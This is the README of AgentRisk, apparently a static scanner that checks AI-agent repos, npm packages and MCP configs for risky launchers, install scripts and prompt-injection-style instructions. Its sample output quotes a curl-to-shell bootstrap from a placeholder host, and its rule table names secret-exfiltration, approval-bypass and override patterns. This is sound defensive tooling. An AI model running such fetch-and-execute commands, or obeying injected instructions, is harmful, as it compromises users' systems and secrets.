# AgentRisk

[![CI](https://github.com/Renga154/agentrisk/actions/workflows/ci.yml/badge.svg)](https://github.com/Renga154/agentrisk/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/agentrisk.svg)](https://www.npmjs.com/package/agentrisk)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

[English](README.md) | [日本語](README.ja.md)

AgentRisk is a **scan-before-trust CLI and MCP server** for AI-agent workspaces. Point it at an unknown repository, GitHub URL, npm package, or tarball before your AI coding agent opens it, and AgentRisk flags risky MCP launchers, install scripts, and repo instructions without executing the target.

Think of it as a security gate for `.mcp.json`, `AGENTS.md`, `SKILL.md`, Cursor rules, Copilot instructions, and `package.json`: it helps catch "download and run this script", "forward this secret", and "ignore approval" patterns before an agent gets the chance to follow them.

![AgentRisk demo](https://raw.githubusercontent.com/Renga154/agentrisk/main/assets/agentrisk-demo.gif)

It never connects to MCP servers. It never runs package scripts. It never installs target dependencies. It never asks an LLM to decide whether your workspace is safe.

```bash
npx --yes agentrisk@latest scan https://github.com/owner/suspicious-agent-repo
npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3
npx --yes agentrisk@latest scan ./downloaded-agent.tgz
npx --yes agentrisk@latest mcp config
```

```text
AgentRisk scan
Source: github owner/suspicious-agent-repo
Root: /repo
Files: 3 scanned, 3 matched
Verdict: BLOCK
Findings: 3 critical, 4 high, 2 medium

CRITICAL
  mcp-remote-fetch-exec [high]
    MCP server "bootstrap" appears to download and execute remote code.
    .mcp.json:5:23
    evidence: bash -c curl https://example.invalid/install.sh | sh
    fix: Pin a reviewed package or binary and avoid curl-to-shell, wget-to-shell, or PowerShell Invoke-Expression bootstraps.
```

## Quick Start

Scan a repository, npm package, or local archive without installing AgentRisk:

```bash
npx --yes agentrisk@latest scan github:owner/repo#main
npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3
npx --yes agentrisk@latest scan ./downloaded-agent.tgz
```

Add AgentRisk to an MCP client:

```bash
npx --yes agentrisk@latest mcp config
```

That prints a ready-to-copy config:

```json
{
  "mcpServers": {
    "agentrisk": {
      "command": "npx",
      "args": ["-y", "agentrisk@latest", "mcp"]
    }
  }
}
```

Use `pass` as a green light, `review` as human review required, `block` as do not run yet, and `incomplete` as fix parse/read errors before trusting the artifact.

## Why This Exists

AI agents increasingly read repo instructions and execute tool calls from local configuration. That makes files like `.mcp.json`, `AGENTS.md`, `.cursor/rules/*`, `SKILL.md`, `.github/agents/*`, and `package.json` part of the agent supply chain.

AgentRisk gives developers and security teams a local, reviewable gate:

- scan untrusted agent repos, packages, and archives before opening or installing them
- catch risky MCP launch commands and secret-bearing env forwarding
- flag prompt-injection-style repo instructions
- generate SARIF for GitHub code scanning
- keep all checks deterministic and auditable

## What It Scans

AgentRisk currently discovers:

- `.mcp.json`
- `mcp.json`
- `claude_desktop_config.json`
- `.cursor/rules/**/*`
- `.github/agents/**/*`
- `SKILL.md`
- `AGENTS.md`
- `CLAUDE.md`
- `GEMINI.md`
- `.github/copilot-instructions.md`
- `package.json`

## Built-In Rules

| Rule | Default | What it flags |
| --- | --- | --- |
| `mcp-remote-fetch-exec` | critical | MCP commands that download and execute remote code |
| `mcp-privileged-container` | critical | Docker MCP launches with host-level privileges or sensitive mounts |
| `mcp-shell-wrapper-command` | high | MCP launch commands hidden behind shell wrappers |
| `mcp-unpinned-dlx` | medium | package, language, and container launchers without obvious version pins |
| `mcp-sensitive-env-pass-through` | high | secret-looking or broad env forwarding into MCP servers |
| `mcp-external-binary-reference` | medium | absolute executable paths outside the scanned artifact |
| `package-postinstall-remote-exec` | critical | install lifecycle scripts with remote execution |
| `package-script-shell-trampoline` | medium | package scripts that hide behavior behind shell command strings |
| `instruction-secret-exfiltration` | critical | instructions that ask agents to read or print secrets |
| `instruction-approval-bypass` | high | instructions that encourage skipping approval or review |
| `instruction-policy-override` | high | prompt-injection-style override language |
| `instruction-remote-tool-install` | medium | instructions that ask agents to install or execute external tools |
| `conflicting-agent-instructions` | medium | conflicting safety guidance across agent instruction files |

Inspect the rule pack:

```bash
npx --yes agentrisk@latest rules list
npx --yes agentrisk@latest rules show mcp-remote-fetch-exec
```

The checked-in corpus currently reports **3/3 benign cases clean** and **5/5 malicious cases detected**. See [docs/corpus-report.md](docs/corpus-report.md), generated with `npm run corpus:evaluate`.

## Scan Before Trust

Use without installing:

```bash
npx --yes agentrisk@latest scan .
```

Preflight remote artifacts:

```bash
# GitHub repo default branch
npx --yes agentrisk@latest scan https://github.com/modelcontextprotocol/servers

# GitHub shorthand with a ref
npx --yes agentrisk@latest scan github:owner/repo#v1.2.3

# npm package tarball, downloaded and extracted without running scripts
npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3

# Local or remote tarballs
npx --yes agentrisk@latest scan ./agent-server.tgz
npx --yes agentrisk@latest scan https://example.com/agent-server.tar.gz
```

For remote, npm, and archive targets, AgentRisk ignores any target-provided `agentrisk.config.json` unless you pass `--config` explicitly. An untrusted artifact should not get to configure away its own scan.

## Install

Install globally:

```bash
npm install -g agentrisk
agentrisk scan .
```

Use from a checked-out repository:

```bash
npm install
npm run build
node dist/cli.cjs scan .
node dist/mcp-cli.cjs
```

## CLI

```bash
agentrisk scan [path]
agentrisk rules list
agentrisk rules show <ruleId>
agentrisk config print [path]
agentrisk schema config
agentrisk schema report
agentrisk mcp
agentrisk mcp config
```

Useful scan flags:

```bash
agentrisk scan . --format terminal
agentrisk scan . --format json --output agentrisk.json
agentrisk scan . --format markdown --output agentrisk.md
agentrisk scan . --format sarif --output agentrisk.sarif
agentrisk scan github:owner/repo#main --max-download-size 25000000
agentrisk scan . --fail-on medium
agentrisk scan . --exclude-rule mcp-unpinned-dlx
agentrisk scan . --gitignore
```

## MCP Server

AgentRisk can run as a local stdio MCP server so LLM clients can ask it to scan an artifact before trusting it.

The server exposes one tool:

- `agentrisk_scan`: statically scans a local path, GitHub target, npm package, or archive and returns a text summary plus a structured AgentRisk report

Run it directly:

```bash
npx --yes agentrisk@latest mcp
```

Generate a config snippet:

```bash
npx --yes agentrisk@latest mcp config
```

Example MCP client configuration:

```json
{
  "mcpServers": {
    "agentrisk": {
      "command": "npx",
      "args": ["-y", "agentrisk@latest", "mcp"]
    }
  }
}
```

Example tool input:

```json
{
  "target": "github:owner/repo#main",
  "profile": "strict",
  "minSeverity": "medium",
  "failOn": "high",
  "maxFindings": 25
}
```

MCP mode keeps the same safety model as the CLI: it may read local files and download explicitly requested GitHub/npm/archive targets, but it does not execute target code, run package scripts, install dependencies, or connect to target MCP servers.

Exit codes:

- `0`: scan completed and no finding met `--fail-on`
- `1`: scan completed and at least one finding met `--fail-on`, or the scan was incomplete
- `2`: invalid command usage or configuration
- `3`: runtime failure

## Configuration

Create `agentrisk.config.json`:

```json
{
  "version": 1,
  "profile": "recommended",
  "failOn": "high",
  "minSeverity": "low",
  "exclude": ["**/fixtures/**"],
  "rules": {
    "mcp-unpinned-dlx": "low",
    "instruction-remote-tool-install": "off"
  }
}
```

`profile: "strict"` raises medium-severity findings to high. That is useful for repositories that want CI to fail on weaker supply-chain and policy signals without rewriting every rule override.

Print the resolved config:

```bash
agentrisk config print .
```

Generate schemas:

```bash
agentrisk schema config > agentrisk-config.schema.json
agentrisk schema report > agentrisk-report.schema.json
```

## GitHub Actions

Use the packaged action:

```yaml
name: AgentRisk

on:
  pull_request:

jobs:
  agentrisk:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@v5
      - uses: Renga154/agentrisk@v0.2.2
        with:
          format: sarif
          output: agentrisk.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: agentrisk.sarif
```

Or run the npm package directly:

```yaml
name: AgentRisk

on:
  pull_request:
  push:
    branches: [main]

jobs:
  agentrisk:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with:
          node-version: 22
      - run: npx --yes agentrisk@0.2.1 scan . --format sarif --output agentrisk.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: agentrisk.sarif
```

## Security Model

AgentRisk is a static scanner. It helps surface risky patterns before execution, but it does not prove that a workspace is safe.

AgentRisk does:

- read files from the target workspace
- download GitHub/npm/archive targets when you explicitly pass those targets
- parse known config and instruction formats
- run deterministic built-in rules
- emit evidence and locations

AgentRisk does not:

- execute MCP servers
- run package scripts
- install dependencies from the target
- honor target `.gitignore` by default
- trust target-provided AgentRisk config for remote/npm/archive targets
- connect to model providers
- send content to LLMs by itself; MCP clients decide what to show the model
- send workspace contents to remote services
- guarantee zero false positives or complete coverage

## Roadmap

- Expand the public malicious/benign corpus with real-world reduced cases
- Add head-to-head evaluation notes against adjacent tools
- Add baseline suppression files for large repos
- Add signed community rule packs
- Expand capability graph analysis for tools, data reach, and network egress
- Expand coverage for marketplace metadata and packaged skills

## Development

```bash
npm install
npm test
npm run typecheck
npm run build
npm run check
```

## Responsible Disclosure

If you believe AgentRisk misses a dangerous pattern or reports unsafe advice, please open a private security advisory on GitHub when the repository is public. For normal false positives, open an issue with a minimal reproducible fixture.

## License

Apache-2.0
